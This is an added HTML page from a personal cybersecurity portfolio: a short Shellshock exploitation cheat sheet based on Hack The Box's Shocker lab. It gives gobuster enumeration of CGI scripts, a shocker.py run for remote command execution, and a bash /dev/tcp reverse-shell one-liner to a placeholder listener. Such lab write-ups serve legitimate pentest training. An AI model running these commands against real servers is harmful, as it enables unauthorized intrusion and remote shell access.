@@ -1,0 +1,92 @@
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Shellshock Exploit Reference | Jonathan Vargas</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="index.html" class="logo">Jonathan Vargas</a>
+					</header>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">December 19, 2020</span>
+									<h1>Shellshock Exploit Guide
+									</h1>
+								</header>
+
+								<br>
+								<p style="text-align:center">This is my second article in the "Field Reference" series. The following's intended use is to be quickly reviewed during pentesting engagements, meaning most simple subjects will not be elaborated on due to unpredictable variables in each machine's environment.</p>
+
+								<br><br><br><h2>Contents:</h2>
+								<ol>
+									<li><b><a href='#prereq'>Requirements</a></b></li>
+									<li><b><a href='#prep'>Setup</a></b></li>
+									<li><b><a href='#snap'>Exploitation</a></b></li>
+								</ol>
+
+
+
+								<br><br><br>
+								<h2 id="prereq">Requirements</h2>
+								<ul>
+								<li>Host is running an Apache Server</li>
+								<li>A reachable script is located in /cgi-bin</li>
+								<li>The script is client-executable.</li>
+								</ul>
+								<p><br><br><br></p>
+								<h2 id="setup">The Setup</h2>
+								<p><strong>Locate the executable cgi script on the remote server.</strong> This may be a file with an extension of .sh, .cgi, .cg, .py, or .pl extension. Enumerate .cgi first, then .sh if time is constrained. While working on <a href="https://app.hackthebox.eu/machines/108">Hack The Box&#39;s Shocker machine</a>, I found the shell script by brute forcing hidden scripts using gobuster:</p>
+								<pre><code class="lang-bash">gobuster dir -u <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.56</span>/cgi-bin -w /usr/share/wordlists/dirbuster/directory-<span class="hljs-type">list</span><span class="hljs-number">-2.3</span>-medium.txt -t <span class="hljs-number">25</span> -x .cgi,.sh</code></pre>
+								<p>Clone the following github repository to your local working directory:</p>
+								<pre><code class="lang-bash">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/nccgroup/shocker.git</code></pre>
+								<p><br><br><br></p>
+								<h2 id="exploitation">Exploitation</h2>
+								<p>Run the shocker.py script with two arguments: the remote host and the cgi script to abuse.</p>
+								<pre><code class="lang-bash">./shocker.py --Host <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.56</span> -c /cgi-bin/user.sh</code></pre>
+								<p>You should now have a limited shell for remote command execution. There are things to keep in mind when executing commands on the server. You must use the full path for command execution (i.e, /bin/cat /etc/passwd). Lastly, you are using a non-interactive shell, so the next best step would be to leverage your RCE into an interactive reverse shell:</p>
+								<pre><code class="lang-bash"><span class="hljs-meta-keyword">/bin/</span>bash -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>tcp/<span class="hljs-params">&lt;LHOST&gt;</span>/<span class="hljs-params">&lt;LPORT&gt;</span> <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span></code></pre>
+
+
+
+
+                </body>
+                </html>
+
+						</section>
+
+					</div>
+
+				<!-- Footer -->
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>Jonathan Vargas</li><li>Cybersec Portfolio</li></ul>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
